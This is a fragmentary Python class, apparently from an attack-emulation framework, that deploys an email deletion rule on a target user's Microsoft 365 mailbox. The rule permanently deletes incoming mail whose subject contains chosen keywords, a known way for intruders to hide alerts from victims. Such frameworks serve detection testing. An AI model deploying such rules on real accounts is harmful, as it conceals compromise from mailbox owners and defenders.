...
class M365DeployEmailDelRule(BaseTechnique):
    def __init__(self):
        ...
        super().__init__(
            ...
            "Sets up email deletion rule on target user mailbox",
            mitre_techniques,
        )
    ...
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        ...
        try:
            ...
            data = {
                ...
                "sequence": 1,
                "isEnabled": "true",
                "conditions": {"sentToMe": "true", "subjectContains": keywords},
                "actions": {"permanentDelete": "true", "stopProcessingRules": "true"},
            }
            ...
            if 200 <= raw_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": "Successfully deployed email deletion rule on mailbox",
                    "value": {
                        "rule_name": rule_name,
